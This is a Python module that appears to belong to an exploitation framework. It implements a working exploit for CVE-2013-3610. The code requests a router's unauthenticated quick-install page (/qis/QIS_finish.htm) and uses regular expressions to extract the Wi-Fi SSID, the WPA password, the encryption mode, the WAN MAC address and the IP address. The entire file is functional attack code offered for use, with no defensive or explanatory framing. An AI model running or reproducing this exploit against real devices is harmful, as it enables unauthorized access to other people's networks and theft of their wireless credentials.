# -*- coding: utf-8 -*-

import requests
import logging
import re

from nios.core.exploits.CExploitBase import CExploitBase
from nios.core.CNiosCore import CNiosCore
from nios.core.auxiliary import exception
from nios.core.CScheduler import CTask


ENCRYPTION_MODE = {
    0: "disabled",
    1: "open",
    2: "WPA",
    4: "WPA2",
    6: "WPA2_MIXED"
}

REGEX_LIST = [
    re.compile(r"name=\"(rt_ssid)2\" value=\"(.+)\"", re.I),
    re.compile(r"name=\"(rt_wpa_psk)\" value=\"(.+)\"", re.I),
    re.compile(r"(encrypt) = (\d);", re.I),
    re.compile(r"(reIP) = '([\.0-9]+)';", re.I),
    re.compile(r"(wan_hwaddr) = '([\:0-9a-f]+)';", re.I),
    re.compile(r"(wan_clone_mac) = '([\:0-9a-f]+)';", re.I),
]

KEY_NAMES = [
    ("rt_ssid", "ssid"), # url decode
    ("wan_hwaddr", "bssid"),
    ("rt_wpa_psk", "wpa_password"),
]


class CVE_2013_3610(CExploitBase):

    mCve = 'CVE-2013-3610'

    def __init__(self, core: CNiosCore):
        self.mCore = core

    def __call__(self, host, port):
        url = f"http://{host}:{port}"

        return self.getQuickInstallFinish(url)

    def executeRequest(self, url):
        httpTimeout = self.mCore.mConfig.get("timeout.http", 2)
        try:
            return requests.get(url, timeout=httpTimeout)
        except Exception:
            return None

    def getQuickInstallFinish(self, url):
        result = self.executeRequest(f"{url}/qis/QIS_finish.htm")
        if result is not None:
            data = self.dataPostProccess(self.parseByRegex(result.text))
            return {self.mCve: data}

    @staticmethod
    def parseByRegex(content):
        data = {}
        for regex in REGEX_LIST:
            result = regex.search(content)
            if not result:
                continue

            (key, value) = result.group(1), result.group(2)

            data.update({key: value})

        return data

    @staticmethod
    def dataPostProccess(data: dict) -> dict:
        for old, new in KEY_NAMES:
            if old in data:
                data[new] = data.pop(old)

        if "encrypt" in data:
            data["encrypt"] = ENCRYPTION_MODE[int(data["encrypt"])]

        return data